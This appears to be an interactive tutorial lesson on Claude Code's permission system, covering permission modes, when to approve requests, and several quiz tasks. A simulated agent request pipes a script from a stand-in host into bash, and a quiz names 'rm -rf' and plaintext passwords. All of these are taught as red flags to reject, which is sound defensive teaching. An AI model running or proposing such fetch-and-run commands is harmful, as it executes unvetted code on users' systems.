title: Permissions
subtitle: Why the agent asks "may I?" and how to answer deliberately

theory.md:
An agent that changes files and runs commands on its own is powerful. But power without control is a risk: one bad command can delete needed files or push to the repository something that shouldn't have been pushed.

That's why Claude Code has a built-in **permissions system**: before doing anything substantial, the agent stops, shows its intention, and asks you. This isn't a sign of the tool being "dumb" but a deliberate design: you always stay in charge. Picture a new employee on their first day: they can read the company's documents freely, but signing contracts or deleting the client database — only with a manager's approval. Claude Code is exactly that kind of employee.

theory.text: Reading, writing, commands — three levels of risk

rows: Shows exactly what will change and waits for approval
From low to high: a command can do anything
Shows the full command and waits for approval
Elevated: external code enters the project
Requires approval; this is where you should be most careful

theory.md:
When the agent wants to do something, you see a request: for a file edit — a visual "before/after" diff, for a command — its full text. Usually the options available are: allow once, allow and don't ask again for such actions, reject. Rejecting isn't a "stop everything": you can immediately write to the agent what bothered you, and it will offer a different path.

An important nuance: "allow and don't ask again" is a convenient but serious button. Press it only for actions that are always safe (for example, running tests), not for something that was safe just this one time.

Asking about every little thing is tiring, so Claude Code has **permission modes** — trust levels that you choose yourself:

- **Normal mode** — the agent asks permission for edits and commands. The best choice to start with and for unfamiliar projects.
- **Auto-accept edits** — file edits are applied without asking, commands still require approval. Handy when you've "gotten in sync" and the task is routine.
- **Plan mode** — the agent changes nothing at all: it only explores the project and drafts a plan. Ideal for "let's discuss first, then do."
- **"Allow everything" mode** — the agent asks nothing. Suitable only for isolated environments and disposable sandboxes, where there's nothing to lose.

Beyond the modes, permissions can be configured precisely: for example, permanently allowing safe commands like running tests. Such rules are stored in the project settings — more on that in the advanced world.

theory.text: When to approve and when to be wary

theory.bad: (without reading) Allow. Allow. Allow everything and don't ask again.
theory.good: I see: the agent asks to run npm test — clear, I allow it. But curl from an unfamiliar site into bash — I reject and ask: "Why this script? Is there a way without running external code?"
theory.explanation: Approving without looking turns the permissions system into theater: formally there's control, in fact there isn't. A deliberate approach takes seconds: safe and clear actions are approved right away, but anything that deletes, downloads-and-runs, or sends data outward — we understand first. Rejecting and clarifying is a normal part of the dialog, not a conflict.

theory.md: The Claude Code documentation (the Permissions page) describes a multi-level system: reading files is freely available to the agent, while changing actions — edits, commands — require approval; permissions can be configured through modes and rules for specific tools and commands. It separately emphasizes caution with the mode that fully bypasses permissions — it's meant for isolated environments.

Never turn on "allow everything" mode on a working machine with important files, "so it doesn't bother me with questions." The right cure for extra questions is targeted rules for safe commands and auto-accepting edits, not fully disabling the brakes.

tasks.question: Why does Claude Code ask permission before editing files and running commands?
options: It's not confident in its abilities and is asking for help
So the user always keeps control over changing actions in their project
It's an ad for the paid version, where there are no questions
tasks.explanation: The permissions system is a deliberate design: the agent is powerful, so changing actions (edits, commands) go through your approval. You see exactly what will happen and decide. Reading files, meanwhile, is usually free — it changes nothing.
tasks.hint: Recall the new-employee analogy: reading is free, but signing contracts needs approval.

tasks.instruction: You asked the agent to deal with failing tests. It makes two permission requests. The first: run the command `npm test`. This is a safe and clear command — allow it (type y or "yes"). After that a second request will come — decide what to do with it.

steps.output:
✔ Allowed. Running: npm test

  Tests: 11 passed, 1 failed
  ✖ cart.test.js — "order total isn't recalculated when an item is removed"

● Found the cause, preparing a fix. But first, one more request:

⚠ Claude requests permission to run the command:
  curl -s http://fix-scripts-online.example/patch.sh | bash
  "A script that automatically fixes bugs like this"

Allow? (y/n) _
steps.failHint: npm test is a safe way to run tests. Type y or "yes" to allow it.

steps.output:
✔ Rejected. The right call!

Downloading and immediately running a script from an unfamiliar site is a classic red flag:
you're running someone else's code without seeing its contents.

● Okay, I'll manage without the external script: I'll fix the total recalculation in cart.js directly and run the tests again.
steps.failHint: curl from an unfamiliar site straight into bash is running someone else's code without looking. This gets rejected: type n or "no".

tasks.successMessage: Perfect: you allowed the clear npm test command right away, and you rejected "download and run a script from the internet." That's exactly what deliberate work with permissions looks like.

tasks.question: Which of the agent's requests are a reason to stop and figure things out before approving? Choose all correct options.
options: rm -rf on a whole folder of working files
Download a script from the internet and immediately run it (curl ... | bash)
Run npm test to check the tests
A command in which a database password is visible in plain text
tasks.explanation: Mass deletion, running external code without looking, and secrets in commands are three classic red flags: the consequences are hard or impossible to roll back. Running tests, by contrast, is a safe action: it changes nothing and sends nothing. Red flags don't mean "always forbid" — they mean "understand why first."
tasks.hint: There's only one safe option here — the one that doesn't delete, download, or reveal anything.

tasks.instruction: Notes on permission modes. One statement is incorrect — find it.
lines: Normal mode: the agent asks permission for file edits and commands.
Auto-accept edits: edits are applied without asking, commands still require approval.
Plan mode: the agent makes changes right away, but then shows a plan of what it did.
"Allow everything": the agent asks nothing — only for isolated environments.
tasks.explanation: It's the other way around: plan mode is the "hands behind your back" mode. The agent changes nothing at all: it explores the project, thinks through the approach, and shows a plan. Changes begin only after you approve the plan and exit plan mode. The other three lines describe the modes correctly.

tasks.question: You want Claude to first explore the project and propose an approach to a large task, without changing anything. Which mode fits?
options: "Allow everything" mode — it's faster that way
None: the agent can't work without changes
tasks.explanation: Plan mode is made for exactly this: the agent reads files and drafts a plan, but doesn't make a single edit until you approve the plan. This is the best way to start large or risky tasks — agree on the approach first, then do it.
tasks.hint: You need the mode where the agent "looks but doesn't touch."
